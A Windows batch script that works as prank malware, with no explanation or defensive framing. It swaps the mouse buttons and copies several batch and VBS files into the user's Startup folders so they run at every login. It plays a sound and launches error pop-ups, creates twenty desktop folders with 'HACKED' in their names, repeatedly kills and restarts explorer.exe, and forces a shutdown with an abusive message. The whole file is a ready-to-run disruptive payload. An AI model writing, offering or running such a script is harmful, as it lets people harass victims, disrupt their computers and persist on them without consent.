@echo off
cls

Rundll32 user32, SwapMouseButton

copy startup.bat "%userprofile%\STARTM~1\Programs\Startup"

copy errors.bat "%userprofile%"

copy runerrors.vbs "%userprofile%"

copy Msg.vbs "%userprofile%\STARTM~1\Programs\Startup"

copy Msg.vbs "%userprofile%"

copy run.vbs "%userprofile%\STARTM~1\Programs\Startup"

copy UnrealV4.bat "%userprofile%\STARTM~1\Programs\Startup"



copy startup.bat "%userprofile%\Start Menu\Programs\Startup"

copy errors.bat "%userprofile%\Start Menu\Programs\Startup"

copy runerrors.vbs "%userprofile%\Start Menu\Programs\Startup"

copy Msg.vbs "%userprofile%\Start Menu\Programs\Startup"

copy run.vbs "%userprofile%\Start Menu\Programs\Startup"

copy UnrealV4.bat "%userprofile%\Start Menu\Programs\Startup"



set "file=jebaited.mp3"
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "%file%"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >sound.vbs
  ping localhost -n 2 >NUL
start /min sound.vbs

start runerrors.vbs

cd Desktop

md %userprofile%\Desktop HACKED
md %userprofile%\Desktop HACKED2
md %userprofile%\Desktop HACKED3
md %userprofile%\Desktop HACKED4
md %userprofile%\Desktop HACKED5
md %userprofile%\Desktop HACKED6
md %userprofile%\Desktop HACKED7
md %userprofile%\Desktop HACKED8
md %userprofile%\Desktop HACKED9
md %userprofile%\Desktop HACKED10
md %userprofile%\Desktop HACKED11
md %userprofile%\Desktop HACKED12
md %userprofile%\Desktop HACKED13
md %userprofile%\Desktop HACKED14
md %userprofile%\Desktop HACKED15
md %userprofile%\Desktop HACKED16
md %userprofile%\Desktop HACKED17
md %userprofile%\Desktop HACKED18
md %userprofile%\Desktop HACKED19
md %userprofile%\Desktop HACKED20

taskkill /F /IM explorer.exe
ping localhost -n 2 >NUL
start explorer.exe
ping localhost -n 2 >NUL
taskkill /F /IM explorer.exe
ping localhost -n 2 >NUL
start explorer.exe
ping localhost -n 2 >NUL
taskkill /F /IM explorer.exe
ping localhost -n 2 >NUL
start explorer.exe
ping localhost -n 2 >NUL
taskkill /F /IM explorer.exe
ping localhost -n 2 >NUL
start explorer.exe

shutdown -s -t 3 -c "Bye Bye Bitch! HAHAHAAHAHAH"


